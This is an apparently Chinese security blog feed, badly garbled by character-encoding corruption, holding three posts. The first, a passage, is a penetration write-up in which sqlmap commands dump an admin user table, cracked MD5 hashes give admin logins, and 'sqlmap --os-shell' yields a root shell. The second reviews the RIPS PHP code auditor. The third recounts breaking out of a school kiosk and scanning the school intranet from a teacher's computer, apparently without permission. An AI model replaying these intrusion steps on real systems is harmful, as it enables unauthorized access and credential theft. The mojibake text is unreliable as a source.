src="https://s2.loli.net/2023/04/19/aD5vJPpdItVkgU4.png" alt="image"></p><p>ç„¶åæ‰§è¡Œ<br><code>sqlmap -r C:\Users\Samsung\Desktop\1.txt --columns -T &quot;net_admin_user&quot; -D &quot;nd_net&quot;   //åˆ—å‡ºnet_admin_user</code>è¡¨çš„å­—æ®µ<br><img src="https://s2.loli.net/2023/04/19/syGtfThrBKvXSep.png" alt="image"></p><p>æœ€åæ‰§è¡Œå‘½ä»¤<br><code>sqlmap.py -r &quot;I:\T00l\1.txt&quot; --dump -C &quot;id,nd_user,userid,nd_pass&quot; -T &quot;net_admin_user&quot; -D &quot;nd_net&quot; --threads=10   //å¯¼å‡ºnet_admin_userè¡¨ä¸­id,nd_user,userid,nd_passå‡ ä¸ªå­—æ®µçš„æ•°æ®</code><br><img src="https://s2.loli.net/2023/04/19/oRmSxVl5zUELvXQ.png" alt="image"></p><p>å…¨éƒ¨æ˜¯md5åŠ å¯†ï¼Œæ‹¿åˆ°cmd5ï¼Œä¸€æ³¢è§£å¯†ï¼ŒæˆåŠŸè·å–åˆ°æ‰€æœ‰ç®¡ç†å‘˜çš„è´¦å·å¯†ç ï¼Œç„¶åæˆåŠŸç™»é™†ä»¥ç®¡ç†å‘˜çš„æƒé™ç™»é™†åå°<br><img src="https://s2.loli.net/2023/04/19/wuAtjc89YFPogmb.png" alt="image"></p><p>å“ˆå“ˆï¼Œè®²ç©¶ï¼</p><h2 id="å››ã€ä¸æ‹¿Shellï¼Œä¸å’¸é±¼æœ‰ä»€ä¹ˆåŒºåˆ«ï¼Ÿ"><a href="#å››ã€ä¸æ‹¿Shellï¼Œä¸å’¸é±¼æœ‰ä»€ä¹ˆåŒºåˆ«ï¼Ÿ" class="headerlink" title="å››ã€ä¸æ‹¿Shellï¼Œä¸å’¸é±¼æœ‰ä»€ä¹ˆåŒºåˆ«ï¼Ÿ"></a>å››ã€ä¸æ‹¿Shellï¼Œä¸å’¸é±¼æœ‰ä»€ä¹ˆåŒºåˆ«ï¼Ÿ</h2><p>emmï¼Œå°±ç®—æ˜¯ç®¡ç†å‘˜çš„æƒé™ã€‚æˆ‘å‘ç°å¯ä»¥åˆ©ç”¨çš„åœ°æ–¹ä¾ç„¶å¾ˆå°‘ï¼Œåªæœ‰ä¸€äº›é™æ€é¡µé¢çš„ç¼–è¾‘æƒé™ï¼ˆè€Œä¸”ç¼–è¾‘å™¨æ˜¯KindEditorï¼Œæ²¡ä»€ä¹ˆæ–¹æ³•ä¸Šä¼ æ‹¿Shellï¼‰,æˆ‘å½“æ—¶ååˆ†ç»æœ›ã€‚ã€‚ã€‚ä½†æ˜¯æˆ‘å‘ç°äº†è¿™ä¸ªâ€”â€”æ•°æ®åº“å¤‡ä»½<br><img src="https://s2.loli.net/2023/04/19/NgsyjOKr9BChRux.png" alt="image"></p><p>ç‚¹å‡»åï¼Œè·³è½¬åˆ°ä¸€æ¬¾å«åšâ€œå¸å›½å¤‡ä»½ç‹â€çš„ç¨‹åº<br><img src="https://s2.loli.net/2023/04/19/ceJI6Q2SZquURYj.png" alt="image"></p><p>éšåï¼Œæˆ‘ä¾¿å»è¯¥ç¨‹åºçš„å®˜ç½‘ï¼Œä¸‹è½½äº†ä¸€ä¸ªå¸®åŠ©æ–‡æ¡£ã€‚ä½¿ç”¨é»˜è®¤ç”¨æˆ·admin&#x2F;123456è¿›è¡Œç™»é™†ï¼Œä½†æ˜¯ä»¥å¤±è´¥å‘Šç»ˆã€‚<br>ä½†æˆ‘æ€æœ«å¯èƒ½æ”¾å¼ƒï¼Œæˆ‘ä¸€ä¸ªä¸€ä¸ªæµ‹è¯•äº†ä¹‹å‰åå°SQLæ³¨å…¥å¾—åˆ°çš„å¯†ç ï¼Œæœ€ç»ˆåœ¨ä¸€ä¸ªå¯†ç ä¸ŠæˆåŠŸåœ°ç™»é™†äº†ã€‚ã€‚ã€‚</p><p>æˆ‘é ï¼Œé«˜å…´æ­»æˆ‘ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚<br><img src="https://s2.loli.net/2023/04/19/GIDgkBHJC7LNl3t.png" alt="image"></p><p>å‘ç°äº†ä¸€ä¸ªPHPæ¢é’ˆ<br><img src="https://s2.loli.net/2023/04/19/fLXW47QSDBhOxyZ.png" alt="image"></p><p>å†æå‡ºSQLMAPï¼Œç›´æ¥ä½¿ç”¨å‘½ä»¤ ç”¨ä¹‹å‰çš„æ³¨å…¥ç‚¹è·å–shell</p><p>sqlmap -r C:\Users\Samsung 700Z5C\Desktop\1.txt â€“os-shell<br><img src="https://s2.loli.net/2023/04/19/ORNjiFl4C6t1MTh.png" alt="image"></p><p>è¾“å…¥æˆ‘ä»¬é€šè¿‡æ¢é’ˆå¾—åˆ°çš„è·¯å¾„ï¼Œå¾ˆå¹¸è¿ï¼ŒROOTæƒé™ç›´æ¥os-shellæˆåŠŸã€‚ç›´æ¥ä¸Šä¸€å¥è¯ï¼ŒGetShellå®Œç¾ç»“æŸ<br><img src="https://s2.loli.net/2023/04/19/NvHrg3s7CSXjh1n.png" alt="image"></p><h2 id="äº”ã€æ€»ç»“"><a href="#äº”ã€æ€»ç»“" class="headerlink" title="äº”ã€æ€»ç»“"></a>äº”ã€æ€»ç»“</h2><p>æœ¬æ¬¡æ¸—é€æµ‹è¯•ï¼Œè™½ç„¶æ²¡æœ‰éªšæ“ä½œï¼Œä½†æ˜¯æ€»ä½“æ¥è¯´ç”¨åˆ°äº†è®¸å¤šçŸ¥è¯†ï¼Œç°è¿›è¡Œæ€»ç»“<br>1.XSSç›²æ‰“æŠ€æœ¯<br>2.SQLMAPæ³¨å…¥HTTPå“åº”åŒ…çš„è¯­æ³•<br>3.äººæ€§çš„å¼±ç‚¹åˆ†æï¼ˆå¤šä¸ªç¨‹åºç”¨åŒä¸€ä¸ªç®¡ç†å¯†ç ï¼‰<br>4.ä»è·å–ç»å¯¹è·¯å¾„åˆ°SQLMAPè·å–shell<br>5.å®¡æŸ¥å…ƒç´ å°æŠ€å·§</p>]]></content>
      
      
      <categories>
          
          <category> æ¼æ´æŒ–æ˜ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> æ¼æ´æŒ–æ˜ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHPä»£ç å®¡è®¡ç¥å™¨â€”â€”RIPSä¸ªäººæ±‰åŒ–ç‰ˆ</title>
      <link href="/2018/04/10/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E7%A5%9E%E5%99%A8%E2%80%94%E2%80%94RIPS%E4%B8%AA%E4%BA%BA%E6%B1%89%E5%8C%96%E7%89%88-1/"/>
      <url>/2018/04/10/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E7%A5%9E%E5%99%A8%E2%80%94%E2%80%94RIPS%E4%B8%AA%E4%BA%BA%E6%B1%89%E5%8C%96%E7%89%88-1/</url>
      
        <content type="html"><![CDATA[<h2 id="ä¸€ã€RIPSç®€ä»‹"><a href="#ä¸€ã€RIPSç®€ä»‹" class="headerlink" title="ä¸€ã€RIPSç®€ä»‹"></a>ä¸€ã€RIPSç®€ä»‹</h2><p>RIPSæ˜¯ä¸€æ¬¾PHPå¼€å‘çš„å¼€æºçš„PHPä»£ç å®¡è®¡å·¥å…·ï¼Œç”±å›½å¤–çš„å®‰å…¨ç ”ç©¶è€…Johannes Dahseå¼€å‘ï¼Œç›®å‰å¼€æºçš„æœ€æ–°ç‰ˆæœ¬æ˜¯0.55ã€‚</p><p>ç¨‹åºå°å·§ç²ç‘ï¼Œä»…æœ‰ä¸åˆ°500kbï¼Œå…¶ä¸­çš„PHPè¯­æ³•åˆ†æéå¸¸ç²¾å‡†ï¼Œå¯ä»¥å®ç°è·¨æ–‡ä»¶å˜é‡å’Œå‡½æ•°è¿½è¸ªï¼Œè¯¯æŠ¥ç‡è¾ƒä½ã€‚å¹¶æœ‰æ‹¥æœ‰ç®€å•æ˜“æ‡‚çš„ç”¨æˆ·ç•Œé¢ï¼Œå› æ­¤è¢«è®¸å¤šå®‰å…¨ç ”ç©¶äººå‘˜é’Ÿçˆ±ï¼Œå› æ­¤RIPSå¯è°“æ˜¯PHPä»£ç å®¡è®¡ä¹‹åˆ©å™¨ã€‚</p><p>RIPSé¡¹ç›®çš„å®˜ç½‘ä¸º<a href="http://rips-scanner.sourceforge.net/">http://rips-scanner.sourceforge.net/</a><br>å’Œ <a href="https://www.ripstech.com/">https://www.ripstech.com/</a><br>å¤§å®¶å¦‚æœæœ‰å…´è¶£å¯ä»¥è‡ªè¡Œäº†è§£</p><p>ç›®å‰RIPSçš„å…è´¹å¼€æºç‰ˆæœ¬å·²åœæ­¢äº†ç¨‹åºæ›´æ–°ï¼Œä½†å®˜æ–¹ç›®å‰ç»™å‡ºäº†ä¸‹ä¸ªç‰ˆæœ¬çš„è¯´æ˜<br><img src="https://s2.loli.net/2023/04/19/5BEldw4iNJIxtfO.png" alt="image"><br>ç®€è€Œè¨€ä¹‹å°±æ˜¯å®˜æ–¹æƒ³å¯¹ç¨‹åºçš„æ‰«æç²¾åº¦ï¼ŒåŠŸèƒ½ä¸Šè¿›è¡Œäº†æ›´è¿›ä¸€æ­¥åœ°æ‹“å±•å’Œå‡çº§ï¼Œä½†ç¥ç§˜çš„ä½œè€…ä¹Ÿå¹¶æ²¡æœ‰å‘ŠçŸ¥æˆ‘ä»¬ä¸‹ä¸ªç‰ˆæœ¬çš„æ¨é€æ—¥æœŸï¼Œæ‰€ä»¥æˆ‘è¿™æ¬¡å¸¦æ¥çš„æ˜¯ä¸ªäººæ±‰åŒ–ç‰ˆçš„RIPSâ€”0.55ç‰ˆæœ¬ã€‚</p><p>ä¸ªäººæ±‰åŒ–åçš„å¦‚å›¾æ‰€ç¤º<br><img src="https://s2.loli.net/2023/04/19/DfkxF5wWYjMIv97.png" alt="image"><br><img src="https://s2.loli.net/2023/04/19/5BEldw4iNJIxtfO.png" alt="image"><br>éƒ¨åˆ†åœ°æ–¹æ±‰åŒ–ä¸å…¨ï¼Œè¿˜è¯·å„ä½å¤§ä½¬ä»¬æµ·æ¶µ<br>ä¸‹è½½åœ°å€è§æ–‡æœ«</p><h2 id="äºŒã€RIPSå®‰è£…ç¯å¢ƒ"><a href="#äºŒã€RIPSå®‰è£…ç¯å¢ƒ" class="headerlink" title="äºŒã€RIPSå®‰è£…ç¯å¢ƒ"></a>äºŒã€RIPSå®‰è£…ç¯å¢ƒ</h2><p>RIPSæ˜¯åŸºäºPHPè¿›è¡Œç¼–å†™çš„ï¼Œé‚£ä¹ˆæˆåŠŸåœ°è¿è¡ŒRIPSä¾¿ä¸€å®šéœ€è¦PHPç¯å¢ƒçš„æ”¯æŒï¼Œåœ¨æ­¤æˆ‘æ¯”è¾ƒæ¨èä½¿ç”¨PHPStudyè¿™æ¬¾ç¨‹åºæ¥è¿›è¡Œæœ¬åœ°PHPç¯å¢ƒå®‰å…¨<br>PHPstudyä¸‹è½½é“¾æ¥:<a href="http://phpstudy.php.cn/">http://phpstudy.php.cn/</a><br>å®‰è£…åç•Œé¢å¦‚å›¾æ‰€ç¤º:<br><img src="https://s2.loli.net/2023/04/19/E9Hm2B6nMwUdrst.png" alt="image"></p><p>ä¸‹è½½RIPSåå°†å…¶è§£å‹æ”¾å…¥PHPstduyçš„æ ¹ç›®å½•ä¸‹å³å¯ä½¿ç”¨ï¼ˆæ— éœ€è¿›è¡Œä»»ä½•æ•°æ®åº“é…ç½®ï¼‰<br><img src="https://s2.loli.net/2023/04/19/FkCg9BeUAzVDcJu.png" alt="image"></p><p>å¦‚å›¾ä¸ºRIPSå®‰è£…æˆåŠŸåçš„ç•Œé¢<br><img src="https://s2.loli.net/2023/04/19/1qeawEB4OxmRr2c.png" alt="image"></p><h2 id="ä¸‰ã€RIPSä½¿ç”¨æ–¹æ³•"><a href="#ä¸‰ã€RIPSä½¿ç”¨æ–¹æ³•" class="headerlink" title="ä¸‰ã€RIPSä½¿ç”¨æ–¹æ³•"></a>ä¸‰ã€RIPSä½¿ç”¨æ–¹æ³•</h2><p>åœ¨ç¨‹åºçš„é¡¶éƒ¨â€æºç çš„ç»å¯¹è·¯å¾„â€æ–‡æœ¬æ¡†ä¸­è¾“å…¥ä½ æƒ³è¦æ‰«æçš„é¡¹ç›®çš„ç»å¯¹è·¯å¾„(å¦‚F:&#x2F;&#x2F;person&#x2F;phpstduy&#x2F;WWW&#x2F;dedecms)<br>ç„¶åæ ¹æ®ä¸ªäººçš„éœ€æ±‚æ¥é€‰æ‹©æ‰«ææ¼æ´çš„èŒƒå›´ï¼Œæ˜¯å¦æ‰«ææ ¹ç›®å½•ç­‰ï¼Œæœ€åç‚¹å‡»æ‰«æå³å¯ã€‚<br><img src="https://s2.loli.net/2023/04/19/ZIVGoWAEaQj6zHx.png" alt="image"><br><img src="https://s2.loli.net/2023/04/19/5iNsH2lgMS7ZAhw.png" alt="image"></p><p>æ‰«æåå³å¯æŸ¥çœ‹æ‰«ææŠ¥å‘Š<br><img src="https://s2.loli.net/2023/04/19/HqVcEukiFl9zpwY.png" alt="image"></p><h2 id="å››ã€RIPSå®¡è®¡å®ä¾‹"><a href="#å››ã€RIPSå®¡è®¡å®ä¾‹" class="headerlink" title="å››ã€RIPSå®¡è®¡å®ä¾‹"></a>å››ã€RIPSå®¡è®¡å®ä¾‹</h2><p>æˆ‘ä»¬å…ˆä»¥ç¬”è€…å¤šå¹´å‰åˆšåˆšå­¦PHPæ—¶å†™çš„åƒåœ¾ç¨‹åºå¼€ä¸€ä¸‹åˆ€(æ‹¿è€è£¤å†™çš„ï¼Œä½ æ‡‚å¾—)<br><img src="https://s2.loli.net/2023/04/19/tkVbpl9LaFjZQUm.png" alt="image"></p><p>æ‰«æåç»“æœå¦‚å›¾<br><img src="https://s2.loli.net/2023/04/19/56mHoitakzhPpQ8.png" alt="image"></p><p>å¯ä»¥çœ‹åˆ°å­˜åœ¨XSSã€æ–‡ä»¶è¯»å–ã€PHPä»£ç æ‰§è¡Œã€HTTP headeræ³¨å…¥ç­‰æ¼æ´ï¼Œæˆ‘ä»¬é€‰æ‹©XSSå’Œæ–‡ä»¶è¯»å–æ¼æ´æ¥æµ‹è¯•ä¸€ä¸‹RIPSå®¡è®¡çš„å‡†ç¡®æ€§ã€‚</p><h3 id="â‘ XSSæ¼æ´å¤„ä»£ç å¦‚ä¸‹"><a href="#â‘ XSSæ¼æ´å¤„ä»£ç å¦‚ä¸‹" class="headerlink" title="â‘ XSSæ¼æ´å¤„ä»£ç å¦‚ä¸‹"></a>â‘ XSSæ¼æ´å¤„ä»£ç å¦‚ä¸‹</h3><pre><code class="php">echo &quot;-&gt;&lt;a href=\&quot;&#123;$_SERVER[&#39;PHP_SELF&#39;]&#125;?path=&quot; . _encode ($f[&#39;..&#39;]) . &quot;\&quot;&gt;ä¸Šçº§ç›®å½•      &lt;/a&gt; &quot;; $f = _opendir (_decode ($_GET[&#39;path&#39;]));  // elseif($_GET == null) else ,$f = _opendir (&#39;xiaojie&#39;);  // elseif($_GET == null),$f = _opendir (&#39;xiaojie&#39;);  // if($_GET == &#39;..&#39;)ï¼Œ</code></pre><p>å¯ä»¥çœ‹åˆ°è¯¥ç¨‹åºå¯¹fè¿™ä¸ªå˜é‡æœªè¿›è¡Œè¿‡æ»¤ï¼Œç›´æ¥å°†å…¶è¾“å‡ºï¼Œå› æ­¤å¾ˆå¯èƒ½å­˜åœ¨XSSæ¼æ´ç»“åˆRIPSçš„æ¼æ´è¯´æ˜å¯ä»¥çŸ¥é“XSSæ¼æ´çš„æˆå› åŠPOC<br><img src="https://s2.loli.net/2023/04/19/yHn4dgwK9T6Mjir.png" alt="image"></p><p>æˆ‘ä»¬æ¥æµ‹è¯•ä¸€ä¸‹<br><img src="https://s2.loli.net/2023/04/19/ol3mVd7GHhz2baj.png" alt="image"></p><p>å¦‚å›¾ï¼Œæˆ‘ä»¬æˆåŠŸåœ°å¼¹çª—äº†ã€‚è¯æ˜RIPSå¯¹è¯¥ç¨‹åºçš„XSSå®¡è®¡æ˜¯å¾ˆå‡†ç¡®çš„ã€‚</p><h3 id="â‘¡ä»»æ„æ–‡ä»¶è¯»å–å¤„ä»£ç å¦‚ä¸‹"><a href="#â‘¡ä»»æ„æ–‡ä»¶è¯»å–å¤„ä»£ç å¦‚ä¸‹" class="headerlink" title="â‘¡ä»»æ„æ–‡ä»¶è¯»å–å¤„ä»£ç å¦‚ä¸‹"></a>â‘¡ä»»æ„æ–‡ä»¶è¯»å–å¤„ä»£ç å¦‚ä¸‹</h3><pre><code>echo echo &quot;-&gt;&lt;a href=\&quot;&#123;$_SERVER[&#39;PHP_SELF&#39;]&#125;?path=&quot; . _encode ($f[&#39;..&#39;]) . &quot;\&quot;&gt;ä¸Šçº§ç›®å½•      &lt;/a&gt; &quot;; $f = _opendir (_decode ($_GET[&#39;path&#39;]));  // elseif($_GET == null) else ,$f = _opendir (&#39;xiaojie&#39;);  // elseif($_GET == null),$f = _opendir (&#39;xiaojie&#39;);  // if($_GET == &#39;..&#39;),</code></pre><p>åŒæ ·çš„ï¼Œè¯¥ç¨‹åºæœªå¯¹dataå˜é‡è¿›è¡Œä»»ä½•éªŒè¯ï¼Œç›´æ¥ä½¿ç”¨file_get_contentsè¯»å–æ–‡ä»¶å†…å®¹<br><img src="https://s2.loli.net/2023/04/19/PsUZuoaTv5iSVJt.png" alt="image"></p><p>æˆ‘ä»¬æ¥è¯»å–ä¸€ä¸ªhostæ–‡ä»¶æµ‹è¯•ä¸€ä¸‹<br><img src="https://s2.loli.net/2023/04/19/nb7GANlTcWEBmsy.png" alt="image"></p><p>å¦‚å›¾ï¼Œæˆ‘ä»¬æˆåŠŸè¯»å–åˆ°äº†hostæ–‡ä»¶çš„å†…å®¹</p><h2 id="äº”ã€æ€»ç»“"><a href="#äº”ã€æ€»ç»“" class="headerlink" title="äº”ã€æ€»ç»“"></a>äº”ã€æ€»ç»“</h2><p>æœ¬ç¯‡æ–‡ç« ä»‹ç»äº†å›½å¤–å®‰å…¨ç ”ç©¶äººå‘˜å¼€å‘çš„PHPä»£ç å®¡è®¡ç¥å™¨â€”â€”RIPSï¼Œå¹¶ä¸”æä¾›äº†ç¬”è€…çš„æ±‰åŒ–ç‰ˆæœ¬ï¼Œç›¸ä¿¡å¤§å®¶å¯ä»¥å€ŸåŠ©è¿™æ¬¾å·¥å…·æ›´å¥½åœ°è¿›è¡Œä»£ç å®¡è®¡ï¼ŒæŒ–åˆ°æ›´å¤šCMSçš„æ¼æ´ã€‚</p><h2 id="å…­ã€ä¸‹è½½"><a href="#å…­ã€ä¸‹è½½" class="headerlink" title="å…­ã€ä¸‹è½½"></a>å…­ã€ä¸‹è½½</h2><p><a href="https://github.com/J0o1ey/rips-Chinese">https://github.com/J0o1ey/rips-Chinese</a></p>]]></content>
      
      
      <categories>
          
          <category> å®‰å…¨å¼€å‘ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ä»£ç å®¡è®¡ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å¯¹æ¯æ ¡ç»ˆç«¯æœºçš„ä¸€æ¬¡æ¸—é€</title>
      <link href="/2017/06/17/%E5%AF%B9%E6%AF%8D%E6%A0%A1%E7%BB%88%E7%AB%AF%E6%9C%BA%E7%9A%84%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F/"/>
      <url>/2017/06/17/%E5%AF%B9%E6%AF%8D%E6%A0%A1%E7%BB%88%E7%AB%AF%E6%9C%BA%E7%9A%84%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F/</url>
      
        <content type="html"><![CDATA[<h2 id="0x01-ä¸€ç‚¹æ„Ÿæ‚Ÿ"><a href="#0x01-ä¸€ç‚¹æ„Ÿæ‚Ÿ" class="headerlink" title="0x01 ä¸€ç‚¹æ„Ÿæ‚Ÿ"></a>0x01 ä¸€ç‚¹æ„Ÿæ‚Ÿ</h2><p>åˆå›åˆ°æœ€åˆçš„èµ·ç‚¹ è®°å¿†ä¸­ä½ é’æ¶©çš„è„¸</p><p>æˆ‘ä»¬ç»ˆäº æ¥åˆ°äº†è¿™ä¸€å¤©                   â€”èƒ¡å¤ã€Šé‚£äº›å¹´ã€‹</p><p>å½“è¿™é¦–æ­Œçš„æ—‹å¾‹åœ¨æˆ‘è€³è¾¹å“èµ·ï¼Œæˆ‘çš„æ€ç»ªä»¿ä½›ä¸€ä¸‹é—´é‡è¿”å¤šå¹´å‰ã€‚<br>æœ‰äº›æƒ…æ€ï¼Œéš¾ä»¥æŠ“ä½ï¼Œæˆ‘å·²å˜æˆå¦‚ä»Šçš„è‡ªå·±ã€‚<br>çºµä½¿å¾ˆå¤šæ•…äººéš¾ä»¥é‡é€¢ï¼Œç”Ÿæ´»éš¾ä»¥é‡è¿”ï¼Œä½†æ˜¯æˆ‘ä¾ç„¶åšä¿¡è¸å®åœ°èµ°å¥½ç°åœ¨çš„è·¯ä¾¿æ˜¯æœ€å¥½çš„é€‰æ‹©ã€‚<br>æœ‹å‹ä»¬ï¼Œå¥½å¥½çæƒœç°åœ¨å¤„åœ¨ä¸€èµ·çš„å‹æƒ…ã€çˆ±æƒ…ï¼Œè¿™äº›é’è‘±å²æœˆçš„å°å¹¸è¿å¯èƒ½ä¼šæˆä¸ºäººç”Ÿä¸­æœ€ç¾çš„ä¸€ç¼•è®°å¿†ã€‚</p><p>è¶ç€æ¯æ ¡çš„å­¦ç”Ÿè¿˜åœ¨ä¸Šè¯¾ï¼Œè€å¸ˆä»¬æ²¡æ”¾å‡ï¼Œæˆ‘æƒ³å›åˆ°æ¯æ ¡èµ°èµ°ï¼Œçœ‹çœ‹é‚£äº›èŠ±å„¿ã€é‚£äº›è‰æœ¨å’Œé‚£äº›æ—¥æ—¥å¤œå¤œé™ªä¼´æˆ‘çš„è€å¸ˆã€‚<br>ä¼´ç€å‘åŠ¨æœºçš„è½°é¸£å£°ï¼Œæˆ‘æ¥åˆ°äº†æ¯æ ¡ã€‚</p><h2 id="0x02-æœ¬æ€§éš¾ç§»"><a href="#0x02-æœ¬æ€§éš¾ç§»" class="headerlink" title="0x02:æœ¬æ€§éš¾ç§»"></a>0x02:æœ¬æ€§éš¾ç§»</h2><p>èµ°åœ¨è¿™ç‰‡ç†Ÿæ‚‰çš„åœŸåœ°ä¸Šï¼ŒæŠšæ‘¸å¤§åœ°çš„æ¯ä¸€å¯¸è‚Œè‚¤ï¼Œå—…ç€èŠ±å„¿çš„èŠ¬èŠ³ï¼Œæ„Ÿå—ç€è“å¤©ç™½äº‘ï¼Œè¿œå±±æ²§æµ·ä¹‹ç¾ï¼Œä¸ç”±å¾—æœ‰äº›å¿ƒæ½®æ¾æ¹ƒ<br>çœ‹ç€æ“åœºä¸Šå¥”è·‘çš„å°‘å¹´ï¼Œæ ¡å›­é‡Œå¿å¿æˆ‘æˆ‘çš„å­¦ç”Ÿã€‚<br>â€œä¾ç„¶æ˜¯é‚£èˆ¬å•çº¯ä¸”ç¾å¥½~â€æˆ‘æ„Ÿå¹åˆ°ã€‚<br>çœ‹äº†ä¸‹æ‰‹è¡¨ï¼Œé©¬ä¸Šå°±è¦åˆ°å’Œè€å¸ˆçº¦å®šçš„æ—¶é—´äº†ï¼Œæˆ‘ä¾¿å¿«é©¬åŠ é­åœ°èµ°å‘è€å¸ˆçš„åŠå…¬å®¤<br>ä½†æ˜¯é€”ä¸­å‘ç°äº†è¿™ä¸ªå¥½ä¸œè¥¿ã€‚ã€‚ã€‚ã€‚æˆ‘è¿™æŠ€æœ¯èœé¸¡çš„ç¦½å…½æœ¬æ€§å°±æš´éœ²æ— é—äº†ã€‚ã€‚<br><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304191407864.png" alt="image"></p><p>æˆ‘å»ï¼Œå­¦æ ¡ç°åœ¨çœŸçš„æ˜¯å‘è¾¾äº†ï¼Œå­¦æ ¡é‡Œéƒ½è£…ä¸Šè¿™ç§æŸ¥è¯¢ç”¨çš„è§¦å±ç»ˆç«¯æœºäº†ã€‚<br>æˆ‘å¥½å¥‡åœ°ç‚¹å¼€å„ä¸ªæ ç›®ã€‚ã€‚æµè§ˆäº†ä¸€ä¸‹å­¦æ ¡çš„å„ç§æ–°é—»ï¼ˆç”±äºç»ˆç«¯æœºå±å¹•äº®ï¼Œè¿™äº›ç…§ç‰‡åå…‰æ¯”è¾ƒå‰å®³ï¼‰<br><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304191407936.png" alt="image"></p><p>ä¸å¾—ä¸ä¸ºæ¯æ ¡çš„æ—¥ç›Šè¾‰ç…Œæ„Ÿåˆ°é«˜å…´å•Šï¼Œç»ˆç«¯æœºé‡Œçš„æ–°é—»éƒ½æŒºç‰›é€¼ã€‚<br>ä½†æ˜¯æˆ‘ç‚¹å‡»å·¦ä¸Šæ–¹çš„LOGOæ—¶ï¼ŒæƒŠå¥‡çš„å‘ç°äº†è¿™ä¸ª<br><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304191407512.png" alt="image"></p><p>æ²¡é”™404ç•Œé¢ï¼Œè¯´æ˜æˆ‘ä»¬åº”è¯¥è¿›å…¥äº†æµè§ˆå™¨ï¼Œé‚£ä¹ˆæˆ‘ä»¬æ€è·¯å¯ä»¥éªšä¸€ç‚¹ï¼Œåˆ©ç”¨æµè§ˆå™¨çš„å®¡æŸ¥å…ƒç´ æ¥å®ç°è¾“å…¥æ³•å·¥å…·æ çš„å¼¹å‡º<br>å½“æˆ‘ä»¬åœ¨404ç•Œé¢æ‰‹æŒ‡é•¿æ‘å±å¹•æ—¶ï¼Œç›¸å½“äºä½¿ç”¨é¼ æ ‡å³é”®<br><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304191406618.png" alt="image-20230419132352843"></p><p>æˆ‘ä»¬ç«‹é©¬ç‚¹å¼€å®¡æŸ¥å…ƒç´ ï¼Œæ‰¾åˆ°ä¸€ä¸ªå¯ä»¥è¾“å…¥å­—ç¬¦çš„åœ°æ–¹ï¼Œå¬å”¤å‡ºæˆ‘ä»¬äº²çˆ±çš„è¾“å…¥æ³•<br><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304191408853.png" alt="image"></p><p>æœç‹—è¾“å…¥æ³•ã€‚ã€‚ã€‚å¯ä»¥å¾ˆå¼ºåŠ¿ï¼Œç‚¹å‡»æœç‹—è¾“å…¥æ³•çš„å·¥å…·æ ï¼ŒæˆåŠŸå¼¹å‡ºWindowsç³»ç»Ÿä¸‹æ–¹çš„å·¥å…·æ <br><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304191408786.png" alt="image"></p><p>ç„¶ååˆ©ç”¨æœç‹—çš„è½¯é”®ç›˜å’Œä¸‹æ–¹çš„Windowså·¥å…·æ ï¼Œæˆ‘ä»¬æˆåŠŸåœ°æ‰“å¼€cmdè¿›è¡Œäº†ä¸€æ³¢ä¿¡æ¯æœé›†ï¼Œè¿™å°ç»ˆç«¯æœºä¹Ÿå®£å¸ƒgg<br><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304191410094.png" alt="image"></p><p>æ²¡é”™ï¼Œå°±è¿™æ ·æŠŠè¿™å°ç»ˆç«¯æœºç»™æ‹¿ä¸‹äº†ï¼Œæˆ‘å¸¦ç€æ»¡å¿ƒæ¬¢å–œï¼Œä¸Šæ¥¼å»æ‰¾ç­ä¸»ä»»çš„åŠå…¬å®¤ã€‚</p><h2 id="0x03-å” å—‘åçš„Getshell"><a href="#0x03-å” å—‘åçš„Getshell" class="headerlink" title="0x03:å” å—‘åçš„Getshell"></a>0x03:å” å—‘åçš„Getshell</h2><p>æ¥åˆ°ç­ä¸»ä»»çš„åŠå…¬å®¤é‡Œï¼Œç­ä¸»ä»»éå¸¸äº²åˆ‡åœ°æ‹›å¾…äº†æˆ‘ä¸€ç•ªï¼Œé¢‡æœ‰ä¸€ç•ªæ´»è·ƒçš„æ°”æ°›<br>è¿‡äº†ä¸€ä¼šï¼Œç­ä¸»ä»»è¯´å¥¹è¦ä¸Šè¯¾äº†ï¼Œæˆ‘å†³å®šç­‰å¥¹ä¸‹ç­åå’Œå¥¹åƒé¡¿é¥­ã€‚äºæ˜¯å¥¹æŠŠæˆ‘å®‰æ’åœ¨å¥¹åŠå…¬å®¤çš„åº§ä½ä¸Šè·Ÿæˆ‘è¯´<br>â€”â€”â€œä½ åœ¨è¿™é‡Œæ‹¿æˆ‘çš„ç”µè„‘çœ‹çœ‹ç½‘é¡µå§ï¼Œæˆ‘ä¸Šå®Œè¯¾å’Œä½ ä¸€å—å‡ºå»å“ˆâ€</p><p>è¿™ä¸€å¥è¯å¯ç®—æ˜¯é«˜å…´åäº†æˆ‘ï¼Œè¿™ç®€ç›´æ˜¯å¼•ç‹¼å…¥å®¤å•Šã€‚ã€‚ã€‚äºæ˜¯æˆ‘æ‹¿å‡ºUç›˜ï¼Œå¼€å§‹å¯¹å­¦æ ¡å†…ç½‘è¿›è¡Œè¿›ä¸€æ­¥çš„æ¢æµ‹ã€‚</p><p>é¦–å…ˆä½¿ç”¨ScanPortå¯¹192æ®µå†…ç½‘å¼€æ”¾çš„WEBæœåŠ¡è¿›è¡Œäº†æ‰«æ</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304191410608.png" alt="image"></p><p>æˆ‘çœ‹äº†ä¸€ä¸‹ï¼Œæœ‰äº›æ˜¯è·¯ç”±å™¨çš„ç®¡ç†ç•Œé¢ï¼Œå°è¯•äº†ä¸€äº›å¼±å£ä»¤çˆ†ç ´æ— 